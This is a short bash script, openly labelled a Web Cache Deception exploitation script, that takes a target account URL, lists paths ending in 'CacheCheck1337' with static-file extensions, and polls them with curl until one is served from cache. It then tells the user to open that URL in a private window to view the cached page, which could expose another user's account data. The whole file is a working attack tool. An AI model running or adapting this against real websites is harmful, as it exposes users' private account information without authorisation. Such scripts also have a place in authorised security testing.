#!/bin/bash

##### Web Cache Deception exploitation script ####
## coder: akrech				##
## github: https://github.com/akr3ch		##
## website: akr3ch.github.io			##
## twitter: a_k_r_e_c_H				##
##################################################

### colors codes ###
bold='\e[1m'
red='\e[31m'
green='\e[32m'
yellow='\e[33m'
blue='\e[34m'
none='\e[0m'

### take url input from the user ###
echo -e "${green}${bold}[+] ${none}${blue}Enter URL address ↔ (example: https://example.com/myaccount)"
read -p "»» " url

### extentions name ###
extentions=(.js .css .jsp .asp .aspx .txt .html .htm .php5 .php4 .php3 .php .phtml .pdf .jpg .png .jpeg .svg .xml .gif)

### print possible exploitable url paths ###
for i in ${extentions[@]};do
	echo -e "${green}[`date '+%T'`] ${none}${blue}Navigate to ${yellow}${url}/CacheCheck1337${i}"
done


### main function ###
function main(){
while true;do
	for x in ${extentions[@]};do
		status=`curl -k --write-out "%{http_code}" --silent --output /dev/null "${url}/CacheCheck1337${x}"`
	if [[ $status == '200' ]];then
		echo -ne "\r${yellow}[`date '+%T'`]${none}${red} Cache data found\n"
		echo -e "${yellow}[`date '+%T'`]${none}${red} Open the url from (Private mode/Incognito mode) ${green}${url}CacheCheck1337${x}"
		false
	else
		echo -ne "\r${green}[`date '+%T'`] ${none}${blue}Waiting..."
	fi
	done
done
}

### run the main function ###
main
